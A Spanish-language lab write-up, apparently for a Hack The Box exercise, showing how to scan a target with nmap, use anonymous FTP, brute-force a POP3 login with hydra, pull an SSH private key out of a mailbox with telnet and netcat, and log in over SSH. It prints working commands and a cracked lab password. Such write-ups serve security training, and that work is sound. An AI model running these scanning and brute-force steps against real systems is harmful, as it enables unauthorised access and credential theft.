# Attacking Common Services - Medium

## Enunciado
The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

## Solución

### nmap
Encontramos los siguientes puertos abiertos: 
```bash
nmap -p- -v --open -sS --min-rate 5000 -Pn -n -oG openPorts_10.129.255.116 -oN openPorts_10.129.255.116.txt 10.129.255.116
```
Encontrando los siguientes puertos abiertos
```txt
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
110/tcp   open  pop3
995/tcp   open  pop3s
2121/tcp  open  ccproxy-ftp
30021/tcp open  unknown
```

### Puerto 30021

- Es un servidor ftp. Nos permite conectamos como usuario `anonymous` 

    ```bash
    ftp anonymous@$target -P 30021
    ```

- Encontrando una carpeta llamada `simon` cuyo contenido, `notes.txt`, parecen ser credenciales. 

### Puerto 110 - pop3

- Aplicamos fuerza bruta con el usuario simon y el arhivo obtenido: 

    ```bash
    hydra -l 'simon' -P mynotes.txt -f $target pop3
    ```

    obteniendo credenciales válidas: `simon:8Ns8j1b!23hs4921smHzwn`

- Nos conectamos vía telnet para ver el contenido del correo

    ```bash
    telnet $target 110                        
    #Una vez conectado
    USER simon
    +OK
    PASS 8Ns8j1b!23hs4921smHzwn
    +OK Logged in.
    LIST
    +OK 1 messages:
    1 1630
    .
    RETR 1
    ```

    obteniendo una clave privada. Automatizamos el proceso para guardar el contenido a un archivo llamado `correo.txt`

    ```bash
    { echo "USER simon"; echo 'PASS 8Ns8j1b!23hs4921smHzwn'; echo "RETR 1"; echo "QUIT";} | nc $target 110 > correo1.txt    
    ```

    `telnet` en este caso no funciona, ya que es interactivo por naturaleza  y maneja los datos de forma distinta
    
### Conexión SSH - Puerto 22

- Guardamos la clave privada (eliminamos saltos de línea y espacios en blanco innecesarios)

    ```bash
    cat correo1.txt | grep -i private | tr -d ' \n' > id_rsa     
    ```

- Le damos los permisos necesarios, comprobamos que la llave está correctamente formateada

    ```bash
     ssh-keygen -lf id_rsaOk
    ```
     y nos conectamos por ssh como usuario `simon`

    ```bash
    ssh -i id_rsaOk simon@$target
    ```

    obteniendo la flag


